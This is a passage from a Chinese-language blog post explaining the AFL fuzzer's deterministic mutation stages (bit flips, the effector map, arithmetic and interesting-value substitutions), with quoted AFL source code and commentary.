class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur);</span><br><span class="line">  <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur + <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">FLIP_BIT</span>(out_buf, stage_cur + <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">stage_finds[STAGE_FLIP4]  += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">stage_cycles[STAGE_FLIP4] += stage_max;</span><br></pre></td></tr></table></figure></li></ul><p>步长为1bit，然后每次翻转4bit。</p><h3 id="bitflip-8-8"><a href="#bitflip-8-8" class="headerlink" title="bitflip 8/8"></a>bitflip 8/8</h3><p>实际上这个函数用来初始化<code>eff_map</code>，该map用来指导之后的变异。</p><ul><li><p>bitflip 8/8部分的代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Effector map setup. These macros calculate:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     EFF_APOS      - position of a particular file offset in the map.</span></span><br><span class="line"><span class="comment">     EFF_ALEN      - length of a map with a particular number of bytes.</span></span><br><span class="line"><span class="comment">     EFF_SPAN_ALEN - map span for a sequence of bytes.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFF_APOS(_p)          ((_p) &gt;&gt; EFF_MAP_SCALE2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFF_REM(_x)           ((_x) &amp; ((1 &lt;&lt; EFF_MAP_SCALE2) - 1))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFF_ALEN(_l)          (EFF_APOS(_l) + !!EFF_REM(_l))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFF_SPAN_ALEN(_p, _l) (EFF_APOS((_p) + (_l) - 1) - EFF_APOS(_p) + 1)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize effector map for the next step (see comments below). Always</span></span><br><span class="line"><span class="comment">     flag first and last byte as doing something. */</span></span><br><span class="line"></span><br><span class="line">  eff_map    = <span class="built_in">ck_alloc</span>(<span class="built_in">EFF_ALEN</span>(len));</span><br><span class="line">  eff_map[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">EFF_APOS</span>(len - <span class="number">1</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    eff_map[<span class="built_in">EFF_APOS</span>(len - <span class="number">1</span>)] = <span class="number">1</span>;</span><br><span class="line">    eff_cnt++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Walking byte. */</span></span><br><span class="line"></span><br><span class="line">  stage_name  = <span class="string">&quot;bitflip 8/8&quot;</span>;</span><br><span class="line">  stage_short = <span class="string">&quot;flip8&quot;</span>;</span><br><span class="line">  stage_max   = len;</span><br><span class="line"></span><br><span class="line">  orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (stage_cur = <span class="number">0</span>; stage_cur &lt; stage_max; stage_cur++) &#123;</span><br><span class="line"></span><br><span class="line">    stage_cur_byte = stage_cur;</span><br><span class="line"></span><br><span class="line">    out_buf[stage_cur] ^= <span class="number">0xFF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We also use this stage to pull off a simple trick: we identify</span></span><br><span class="line"><span class="comment">       bytes that seem to have no effect on the current execution path</span></span><br><span class="line"><span class="comment">       even when fully flipped - and we skip them during more expensive</span></span><br><span class="line"><span class="comment">       deterministic stages, such as arithmetics or known ints. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!eff_map[<span class="built_in">EFF_APOS</span>(stage_cur)]) &#123;</span><br><span class="line"></span><br><span class="line">      u32 cksum;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If in dumb mode or if the file is very short, just flag everything</span></span><br><span class="line"><span class="comment">         without wasting time on checksums. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!dumb_mode &amp;&amp; len &gt;= EFF_MIN_LEN)</span><br><span class="line">        cksum = <span class="built_in">hash32</span>(trace_bits, MAP_SIZE, HASH_CONST);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        cksum = ~queue_cur-&gt;exec_cksum;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (cksum != queue_cur-&gt;exec_cksum) &#123;</span><br><span class="line">        eff_map[<span class="built_in">EFF_APOS</span>(stage_cur)] = <span class="number">1</span>;</span><br><span class="line">        eff_cnt++;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    out_buf[stage_cur] ^= <span class="number">0xFF</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If the effector map is more than EFF_MAX_PERC dense, just flag the</span></span><br><span class="line"><span class="comment">     whole thing as worth fuzzing, since we wouldn&#x27;t be saving much time</span></span><br><span class="line"><span class="comment">     anyway. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (eff_cnt != <span class="built_in">EFF_ALEN</span>(len) &amp;&amp;</span><br><span class="line">      eff_cnt * <span class="number">100</span> / <span class="built_in">EFF_ALEN</span>(len) &gt; EFF_MAX_PERC) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(eff_map, <span class="number">1</span>, <span class="built_in">EFF_ALEN</span>(len));</span><br><span class="line"></span><br><span class="line">    blocks_eff_select += <span class="built_in">EFF_ALEN</span>(len);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    blocks_eff_select += eff_cnt;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  blocks_eff_total += <span class="built_in">EFF_ALEN</span>(len);</span><br><span class="line"></span><br><span class="line">  new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">  stage_finds[STAGE_FLIP8]  += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">  stage_cycles[STAGE_FLIP8] += stage_max;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Two walking bytes. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (len &lt; <span class="number">2</span>) <span class="keyword">goto</span> skip_bitflip;</span><br></pre></td></tr></table></figure></li></ul><p>首先创建了一个<code>eff_map</code>，其大小为测试用例的字节数。然后这里将第一个元素和最后一个元素设置为1，其余设置为0。</p><p>那么接下来就进入到循环中，也就是不断的变异中，这里我们看到此时步长是1字节，每次翻转一个字节。翻转之后即执行<code>common_fuzz_stuff</code> 函数，在执行完毕之后会根据<code>eff_map</code> 中对应字节来判断，在第一次运行的时候实际上<code>eff_map</code> 相应的位置表示的就是当前index对应的字节是否被翻转过。如果没有被翻转过的话，那么这里就会检查路径信息。如果本次变异之后的测试用例导致了路径信息的变化，那么就将<code>eff_map</code> 置为1。</p><p>实际上这里<code>eff_map</code> 表就表示测试用例中有价值的字节的位置。如果其对应的<code>eff_map</code> 中的值为1的话，那么就认为这个字节的变异是有意义的，如果当前的字节是没有意义的话，那么就会在之后的变异过程中跳过对这个字节的变异。</p><p>但是这里存在两个特例</p><ol><li>如果当前测试用例文件大小小于128字节，那么这里就会将当前测试用例的所有字节标记为有意义的。</li><li>如果当前测试用例文件的90%及之上的字节都是有意义的，那么整个文件的所有字节都是有意义的。</li></ol><h3 id="bitflip-16-8"><a href="#bitflip-16-8" class="headerlink" title="bitflip 16/8"></a>bitflip 16/8</h3><p>注意到从这里开始，如果当前的测试用例文件小于2字节的话，那么接下来的变异都不会继续执行了。</p><ul><li><p>bitflip 16/8的代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">stage_name  = <span class="string">&quot;bitflip 16/8&quot;</span>;</span><br><span class="line">stage_short = <span class="string">&quot;flip16&quot;</span>;</span><br><span class="line">stage_cur   = <span class="number">0</span>;</span><br><span class="line">stage_max   = len - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Let&#x27;s consult the effector map... */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!eff_map[<span class="built_in">EFF_APOS</span>(i)] &amp;&amp; !eff_map[<span class="built_in">EFF_APOS</span>(i + <span class="number">1</span>)]) &#123;</span><br><span class="line">    stage_max--;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stage_cur_byte = i;</span><br><span class="line"></span><br><span class="line">  *(u16*)(out_buf + i) ^= <span class="number">0xFFFF</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">  stage_cur++;</span><br><span class="line"></span><br><span class="line">  *(u16*)(out_buf + i) ^= <span class="number">0xFFFF</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">stage_finds[STAGE_FLIP16]  += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">stage_cycles[STAGE_FLIP16] += stage_max;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (len &lt; <span class="number">4</span>) <span class="keyword">goto</span> skip_bitflip;</span><br></pre></td></tr></table></figure></li></ul><p>这里就会用到之前我们计算的<code>eff_map</code> 的信息，这里我们看到此时的步长是1字节，每次翻转2字节的内容。对于<code>eff_map</code> 中连续为0的两个字节，那么不会对这两个字节执行变异的操作。</p><h3 id="bitflip-32-8"><a href="#bitflip-32-8" class="headerlink" title="bitflip 32/8"></a>bitflip 32/8</h3><p>这里如果测试用例的文件小于4字节的话，那么接下来的变异都不会继续执行了</p><ul><li><p>bitflip 32/8</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Four walking bytes. */</span></span><br><span class="line"></span><br><span class="line">stage_name  = <span class="string">&quot;bitflip 32/8&quot;</span>;</span><br><span class="line">stage_short = <span class="string">&quot;flip32&quot;</span>;</span><br><span class="line">stage_cur   = <span class="number">0</span>;</span><br><span class="line">stage_max   = len - <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">3</span>; i++) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Let&#x27;s consult the effector map... */</span></span><br><span class="line">  <span class="keyword">if</span> (!eff_map[<span class="built_in">EFF_APOS</span>(i)] &amp;&amp; !eff_map[<span class="built_in">EFF_APOS</span>(i + <span class="number">1</span>)] &amp;&amp;</span><br><span class="line">      !eff_map[<span class="built_in">EFF_APOS</span>(i + <span class="number">2</span>)] &amp;&amp; !eff_map[<span class="built_in">EFF_APOS</span>(i + <span class="number">3</span>)]) &#123;</span><br><span class="line">    stage_max--;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stage_cur_byte = i;</span><br><span class="line"></span><br><span class="line">  *(u32*)(out_buf + i) ^= <span class="number">0xFFFFFFFF</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">  stage_cur++;</span><br><span class="line"></span><br><span class="line">  *(u32*)(out_buf + i) ^= <span class="number">0xFFFFFFFF</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">stage_finds[STAGE_FLIP32]  += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">stage_cycles[STAGE_FLIP32] += stage_max;</span><br></pre></td></tr></table></figure></li></ul><p>这里的逻辑实际上和<code>bitflip 16/8</code>相同，只不过这里的步长是1字节，每次翻转4字节的内容。而对于<code>eff_map</code> 中连续为0的四个字节，那么就不会对这四个字节执行变异的操作。</p><h2 id="ARITHMETIC-INC-DEC"><a href="#ARITHMETIC-INC-DEC" class="headerlink" title="ARITHMETIC INC/DEC"></a>ARITHMETIC INC/DEC</h2><p>这里如果在AFL启动的时候设置了<code>AFL_NO_ARITH</code> 环境变量的话，那么这里就不会执行本次变异。</p><h3 id="arith-8-8"><a href="#arith-8-8" class="headerlink" title="arith 8/8"></a>arith 8/8</h3><ul><li><p>arith 8/8 部分的代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 8-bit arithmetics. */</span></span><br><span class="line"></span><br><span class="line">stage_name  = <span class="string">&quot;arith 8/8&quot;</span>;</span><br><span class="line">stage_short = <span class="string">&quot;arith8&quot;</span>;</span><br><span class="line">stage_cur   = <span class="number">0</span>;</span><br><span class="line">stage_max   = <span class="number">2</span> * len * ARITH_MAX;</span><br><span class="line"></span><br><span class="line">stage_val_type = STAGE_VAL_LE;</span><br><span class="line"></span><br><span class="line">orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line"></span><br><span class="line">  u8 orig = out_buf[i];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Let&#x27;s consult the effector map... */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!eff_map[<span class="built_in">EFF_APOS</span>(i)]) &#123;</span><br><span class="line">    stage_max -= <span class="number">2</span> * ARITH_MAX;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stage_cur_byte = i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= ARITH_MAX; j++) &#123;</span><br><span class="line"></span><br><span class="line">    u8 r = orig ^ (orig + j);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Do arithmetic operations only if the result couldn&#x27;t be a product</span></span><br><span class="line"><span class="comment">       of a bitflip. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">could_be_bitflip</span>(r)) &#123;</span><br><span class="line"></span><br><span class="line">      stage_cur_val = j;</span><br><span class="line">      out_buf[i] = orig + j;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">      stage_cur++;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> stage_max--;</span><br><span class="line"></span><br><span class="line">    r =  orig ^ (orig - j);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">could_be_bitflip</span>(r)) &#123;</span><br><span class="line"></span><br><span class="line">      stage_cur_val = -j;</span><br><span class="line">      out_buf[i] = orig - j;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line">      stage_cur++;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> stage_max--;</span><br><span class="line"></span><br><span class="line">    out_buf[i] = orig;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">stage_finds[STAGE_ARITH8]  += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">stage_cycles[STAGE_ARITH8] += stage_max;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 16-bit arithmetics, both endians. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (len &lt; <span class="number">2</span>) <span class="keyword">goto</span> skip_arith;</span><br></pre></td></tr></table></figure></li></ul><p>我们看到这里的步长是1字节，每次对1字节进行算数运算。这里的算数运算的逻辑如下</p><p>首先这里会根据<code>eff_map</code>来对当前字节是否有价值进行变异进行一个判断，如果有价值的话，那么就会执行如下的变异策略</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">u8 r = orig ^ (orig + j);</span><br><span class="line">r =  orig ^ (orig - j);</span><br></pre></td></tr></table></figure><p>这里的<code>orig</code> 表示的是当前需要进行运算的字节，这里的j表示的是一个算数，该算数从0递增到<code>ARITH_MAX=35</code> 。这里计算得到结果之后会调用<code>could_be_bitflip</code> 函数对这个字节能否执行bit翻转进行一个判断。这里判断的逻辑是运算之后的字节的值不和之前bit翻转时候的值相同，以减少重复。</p><h3 id="arith-16-8"><a href="#arith-16-8" class="headerlink" title="arith 16/8"></a>arith 16/8</h3><p>这里的逻辑也是相对比较简单的，这里的步长还是1字节，而对于每两个字节都对其尝试了<code>-35,35</code>之内的数值的加减，同时这里考虑了大小端。当然这里也使用了<code>eff_map</code> 中的信息</p><h3 id="arith-32-8"><a href="#arith-32-8" class="headerlink" title="arith 32/8"></a>arith 32/8</h3><p>与<code>arith 16/8</code> 相同，只不过这里变成了四字节的<code>-35,35</code>之内的数值的加减</p><h2 id="INTERESTING-VALUES"><a href="#INTERESTING-VALUES" class="headerlink" title="INTERESTING VALUES"></a>INTERESTING VALUES</h2><p>这里在全局变量中定义了一些感兴趣的数值，实际上这些数值表示了一些临界值。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> s8  interesting_8[]  = &#123; INTERESTING_8 &#125;;</span><br><span class="line"><span class="type">static</span> s16 interesting_16[] = &#123; INTERESTING_8, INTERESTING_16 &#125;;</span><br><span class="line"><span class="type">static</span> s32 interesting_32[] = &#123; INTERESTING_8, INTERESTING_16, INTERESTING_32 &#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTERESTING_8 \</span></span><br><span class="line"><span class="meta">  -128,          <span class="comment">/* Overflow signed 8-bit when decremented  */</span> \</span></span><br><span class="line"><span class="meta">  -1,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   0,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   1,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   16,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   32,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   64,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   100,          <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   127           <span class="comment">/* Overflow signed 8-bit when incremented  */</span></span></span><br></pre></td></tr></table></figure><h3 id="interest-8-8"><a href="#interest-8-8" class="headerlink" title="interest 8/8"></a>interest 8/8</h3><ul><li><p>interest 8/8 代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">stage_name  = <span class="string">&quot;interest 8/8&quot;</span>;</span><br><span class="line">stage_short = <span class="string">&quot;int8&quot;</span>;</span><br><span class="line">stage_cur   = <span class="number">0</span>;</span><br><span class="line">stage_max   = len * <span class="built_in">sizeof</span>(interesting_8);</span><br><span class="line"></span><br><span class="line">stage_val_type = STAGE_VAL_LE;</span><br><span class="line"></span><br><span class="line">orig_hit_cnt = new_hit_cnt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Setting 8-bit integers. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line"></span><br><span class="line">  u8 orig = out_buf[i];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Let&#x27;s consult the effector map... */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!eff_map[<span class="built_in">EFF_APOS</span>(i)]) &#123;</span><br><span class="line">    stage_max -= <span class="built_in">sizeof</span>(interesting_8);</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stage_cur_byte = i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="built_in">sizeof</span>(interesting_8); j++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Skip if the value could be a product of bitflips or arithmetics. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">could_be_bitflip</span>(orig ^ (u8)interesting_8[j]) ||</span><br><span class="line">        <span class="built_in">could_be_arith</span>(orig, (u8)interesting_8[j], <span class="number">1</span>)) &#123;</span><br><span class="line">      stage_max--;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stage_cur_val = interesting_8[j];</span><br><span class="line">    out_buf[i] = interesting_8[j];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">common_fuzz_stuff</span>(argv, out_buf, len)) <span class="keyword">goto</span> abandon_entry;</span><br><span class="line"></span><br><span class="line">    out_buf[i] = orig;</span><br><span class="line">    stage_cur++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new_hit_cnt = queued_paths + unique_crashes;</span><br><span class="line"></span><br><span class="line">stage_finds[STAGE_INTEREST8]  += new_hit_cnt - orig_hit_cnt;</span><br><span class="line">stage_cycles[STAGE_INTEREST8] += stage_max;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Setting 16-bit integers, both endians. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (no_arith || len &lt; <span class="number">2</span>) <span class="keyword">goto</span> skip_interest;</span><br></pre></td></tr></table></figure></li></ul><p>这里就是将测试用例中的某一个字节替换为上述定义的一些字节，这里是每次替换1字节。那么在替换之前还是会检查是否和之前的变异重复。</p><h3 id="interest-16-8"><a href="#interest-16-8" class="headerlink" 